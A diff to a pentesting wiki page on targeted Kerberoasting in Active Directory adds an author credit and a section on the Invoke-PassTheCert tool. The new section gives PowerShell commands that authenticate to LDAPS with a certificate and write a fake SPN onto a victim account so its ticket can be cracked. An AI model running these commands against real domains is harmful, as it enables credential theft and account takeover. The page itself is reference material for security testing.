@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo, sckdev, 0xblank
+authors: ShutdownRepo, sckdev, 0xblank, jamarir
 category: ad
 ---
 
@@ -48,6 +48,21 @@ $User | Get-DomainSPNTicket | fl
 # Clear the SPNs of the target account
 $User | Select serviceprincipalname
 Set-DomainObject -Identity victimuser -Clear serviceprincipalname
+```
+
+The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert).
+
+> Note: the README contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+# Add the 'nonexistent/BLAHBLAH' value into the target's serviceprincipalname attribute
+Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'Kerberoasting' -Target 'CN=VICTIM VU. USER,CN=Users,DC=X' -SPN 'nonexistent/BLAHBLAH'
 ```
 
 :::
